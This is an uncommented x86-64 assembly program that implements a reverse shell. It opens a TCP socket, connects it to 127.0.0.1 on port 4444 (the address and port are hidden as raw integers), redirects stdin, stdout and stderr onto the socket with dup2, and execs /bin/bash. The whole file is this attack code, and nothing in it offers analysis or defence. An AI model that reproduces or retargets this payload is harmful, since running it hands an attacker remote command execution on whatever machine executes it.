.section .data
process:
    .ascii "/bin/bash"

.section .text

create_socket:
    mov $2, %rdi
    mov $1, %rsi
    xor %rdx, %rdx
    mov $41, %rax
    syscall
    mov %rax, %r8
    ret

make_connection:
    push %rbp
    push %rsp
    sub $128, %rsp
    mov %r8, %rdi
    mov %rsp, %rsi
    mov $16, %rdx
    mov $42, %rax
    movw $2, (%rsi)
    movw $23569, 2(%rsi)
    movl $16777343, 4(%rsi)
    movq $0, 8(%rsp)
    syscall
    add $128, %rsp
    pop %rsp
    pop %rbp
    ret

reorder_fd:
    mov $33, %rax
    mov %r8, %rdi
    mov $0, %rsi
    syscall
    mov $33, %rax
    mov %r8, %rdi
    mov $1, %rsi
    syscall
    mov $33, %rax
    mov %r8, %rdi
    mov $2, %rsi
    syscall
    ret

create_process:
    mov $59, %rax
    lea process(%rip), %rdi
    mov $0, %rsi
    mov $0, %rdx
    syscall
    ret

.global main
    .type main, @function
main:
    call create_socket
    call make_connection
    call reorder_fd
    call create_process
    xor %rax,%rax
